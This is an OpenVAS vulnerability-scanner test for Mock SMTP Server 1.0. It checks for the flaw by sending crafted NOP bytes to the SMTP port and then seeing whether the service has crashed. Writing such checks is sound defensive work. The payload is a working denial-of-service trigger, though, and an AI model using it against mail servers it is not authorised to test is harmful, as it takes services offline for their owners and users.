###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mock_smtp_server_dos_vuln.nasl 13144 2019-01-18 10:33:22Z cfischer $
#
# Mock SMTP Server Remote Denial of Service Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805963");
  script_version("$Revision: 13144 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-01-18 11:33:22 +0100 (Fri, 18 Jan 2019) $");
  script_tag(name:"creation_date", value:"2015-08-26 12:20:48 +0530 (Wed, 26 Aug 2015)");
  script_name("Mock SMTP Server Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("smtpserver_detect.nasl");
  script_mandatory_keys("smtp/banner/available");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37954");

  script_tag(name:"summary", value:"The host is running Mock SMTP Server and
  is prone to a denial of service vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted SMTP request
  and check whether it is able to crash the application or not.");

  script_tag(name:"insight", value:"The error exists due to no validation of
  the input passed to the server.");

  script_tag(name:"impact", value:"Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Mock SMTP Server 1.0.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("smtp_func.inc");

port = get_smtp_port(default:25);

sock = open_sock_tcp(port);
if(!sock)
  exit(0);

banner = smtp_recv_banner(socket:sock);
if(! banner || "220" >!< banner) {
  smtp_close(socket:sock, check_data:banner);
  exit(0);
}

##Create a list of crafted data of NOPs
list = make_list("\x90","\x90");
foreach crafteddata(list)
{
  junk = string('\r\n' + crafteddata + '\r\n');
  send(socket:sock, data:junk);
  close(sock);

  sleep(5);

  sock1 = open_sock_tcp(port);
  if(!sock1){
    VULN = TRUE;
  } else {
    banner = smtp_recv_banner(socket:sock1);
    if(!banner) {
      VULN = TRUE;
      close(sock1);
    }
  }

  if(VULN) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);